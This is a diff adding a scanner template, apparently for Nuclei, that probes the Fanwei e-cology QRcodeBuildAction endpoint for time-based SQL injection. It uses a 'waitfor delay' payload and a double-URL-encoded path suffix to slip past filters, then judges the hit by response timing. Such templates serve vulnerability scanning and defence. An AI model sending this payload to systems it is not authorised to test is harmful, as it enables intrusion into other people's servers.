@@ -1,0 +1,25 @@
+id: fanwei-QRcodeBuildAction-sqli
+
+info:
+  name: fanwei-QRcodeBuildAction-sqli
+  author: fanwei-QRcodeBuildAction-sqli
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30?modeid=1452+waitfor+delay+'0%3a0%3a6' HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Accept-Encoding: gzip, deflate
+        Cache-Control: no-cache
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Pragma: no-cache
+        User-Agent: Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - duration > 6 && status_code==200 && len(body) == 0 && contains_all(all_headers,"ecology_JSessionid")
